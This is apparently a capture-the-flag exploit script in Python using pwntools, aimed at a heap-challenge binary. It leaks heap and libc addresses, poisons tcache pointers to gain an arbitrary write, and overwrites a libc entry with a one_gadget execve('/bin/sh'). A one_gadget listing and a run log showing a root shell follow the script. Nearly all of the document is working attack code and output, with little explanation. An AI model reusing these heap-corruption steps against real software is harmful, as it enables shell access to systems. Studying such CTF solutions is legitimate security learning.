#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./main_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.binary = exe
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
pwn.context.timeout = 2000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)
        # return pwn.process("/usr/bin/docker run --rm -i 9de5a84b963f", shell=True)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
b* main
source ~/Downloads/pwndbg/gdbinit.py
continue
'''.format(**locals())

def run():

    io = start()

    def alloc(size, data, newline=True):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"size: ", str(size).encode())
        io.sendafter(b"data: ", data)
        if newline: io.sendline()

    def delete(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b": ", str(idx).encode())

    def view(chunk_id):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"id: ", str(chunk_id).encode())
        return io.recvuntil(b"1. Add", drop=True)

    alloc(0x64, (pwn.p64(0) + pwn.p64(0x51)) * 6)
    alloc(0x64, b"YY")

    for i in range(21):
        alloc(0x64, (pwn.p64(0) + pwn.p64(0x51)) * 6)

    alloc(0x30, pwn.p64(0)*5 + pwn.p64(0x61))

    delete(0)
    delete(1)

    alloc(0x10, b"")

    heap = (((pwn.u64(view(24)[:8]) & ~0xff) | 0x5a) << 12)
    pwn.log.info(f"heap: {hex(heap)}")

    delete(24)

    alloc(0x18, pwn.p64(0x60) + pwn.p64(1) + pwn.p64(heap + 0xfd0 + 0x10))

    delete(0)

    try:
        alloc(0x55, pwn.p64(0) + pwn.p64(0x21))
    except:
        return

    for i in range(2, 2+5+6):
        delete(i)

    alloc(0x35, b"")
    
    libc.address = (((pwn.u64(view(27)[:8])))) - 0x219d0a
    pwn.log.info(f"libc: {hex(libc.address)}")

    alloc(0x35, b"")

    # arb write

    delete(24)
    alloc(0x18, pwn.p64(0x60) + pwn.p64(1) + pwn.p64(heap + 0x5e0))

    delete(0)
    alloc(0x46, pwn.p64(0)*2 + pwn.p64(0) + pwn.p64(0x21) + pwn.p64(((heap + 0x560) >> 12) ^ (libc.address + 0x219090)) ) # strnlen

    alloc(0x10, pwn.p64(libc.address + 0xebcf1)*2)
    io.sendline("id")
    io.sendline("ls")
    io.interactive()

if pwn.args.LOCAL:
    i = 0
    while not run():
        print(i)
        i += 1
        pass
        # break
else:
    run()

"""
# io = start()

def alloc(size, data):
    io.recvuntil(b">", drop=True)
    io.sendlineafter(b" ", b"1")
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", data)

def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())

def view(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())


while True:
    io = start()
    alloc(0x64, (pwn.p64(0) + pwn.p64(0x51)) * 6)
    alloc(0x64, b"YY")

    for i in range(21):
        alloc(0x64, (pwn.p64(0) + pwn.p64(0x51)) * 6)

    alloc(0x30, pwn.p64(0)*5 + pwn.p64(0x61))

    delete(0)
    delete(1)

    alloc(0x10, b"")

    view(24)

    heap = (((pwn.u64(io.recv(8)[:-1].ljust(8, b"\x00")) & ~0xff) | 0x5a) << 12)
    pwn.log.info(f"heap: {hex(heap)}")

    delete(24)

    alloc(0x18, pwn.p64(0x60) + pwn.p64(1) + pwn.p64(heap + 0xfd0 + 0x10))

    delete(0)

    alloc(0x55, pwn.p64(0) + pwn.p64(0x21))

    for i in range(2, 2+5+6):
        delete(i)

    alloc(0x35, b"")
    view(27)

    libc.address = (((pwn.u64(io.recv(8)[:-1].ljust(8, b"\x00"))))) - 0x219d0a
    pwn.log.info(f"libc: {hex(libc.address)}")

    alloc(0x35, b"")


    # arb write

    delete(24)
    alloc(0x18, pwn.p64(0x60) + pwn.p64(1) + pwn.p64(heap + 0x5e0))

    delete(0)
    alloc(0x46, pwn.p64(0)*2 + pwn.p64(0) + pwn.p64(0x21) + pwn.p64(((heap + 0x560) >> 12) ^ (libc.address + 0x219090)) ) # strnlen

    alloc(0x10, pwn.p64(libc.address + 0xebcf1)*2)
    io.interactive()


0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

Only locally >.<

# python3 save.sexploit.py LOCAL
...

[*] heap: 0x5627cb25a000
[*] libc: 0x7f4a29225000
/home/nasm/Documents/pwnstuff/aeroCTF/heap-2022/save.sexploit.py:113: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("id")
/home/nasm/Documents/pwnstuff/aeroCTF/heap-2022/save.sexploit.py:114: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("ls")
[*] Switching to interactive mode
1. Add
2. Delete
3. View
4. Exit
> uid=0(root) gid=0(root) groups=0(root)
Dockerfile    f              main        out              solve.py
actualSolve.py    ld-linux-x86-64.so.2  main.c        save.sexploit.py
exploit.py    libc.so.6          main_patched  sexploit.py
$
    
"""